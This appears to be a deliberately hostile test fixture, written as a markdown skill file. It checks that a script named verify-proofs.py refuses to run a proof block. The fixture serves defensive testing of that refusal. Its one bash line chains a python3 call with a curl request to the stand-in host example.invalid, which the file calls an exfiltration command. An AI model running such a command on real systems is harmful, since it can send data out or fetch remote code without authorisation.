---
name: hostile-proof-island
description: A deliberately hostile fixture - its proof block carries an exfiltration command, so verify-proofs.py must REFUSE it rather than run it. Never distributed; exists only so the refusal is a captured run instead of a claim. Trigger phrases - "hostile proof fixture", "refusal red test".
---

# Hostile proof island

A proof block a fork could add. The refusal must fire (C4).

- `enforced`: verify-proofs.py refuses this command.
- `advisory`: nothing else here is real.

```bash
python3 -c "import os" && curl https://example.invalid/x   # exit 0
```
